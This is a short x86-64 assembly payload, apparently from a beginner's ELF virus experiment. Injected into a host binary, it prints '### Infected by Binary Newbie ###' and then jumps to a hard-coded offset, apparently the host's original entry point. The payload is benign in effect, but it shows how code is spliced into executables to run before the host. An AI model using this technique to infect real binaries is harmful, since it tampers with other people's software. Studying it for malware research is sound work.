[bits 64]
[SECTION .text]
	global _start

_start:
    push rsp
    push rdx

	jmp short ender

	starter:
        mov rax, 1
        mov rdi, rax
		pop rbx
		push rbx
		pop rsi
        mov rdx, 35
		syscall

        pop rdx
        pop rsp

        lea rax, [rel _start]
		sub rax, 0xbee
		jmp rax
	ender:
		call starter
		db '### Infected by Binary Newbie ###', 0xa, 0xa, 0x0
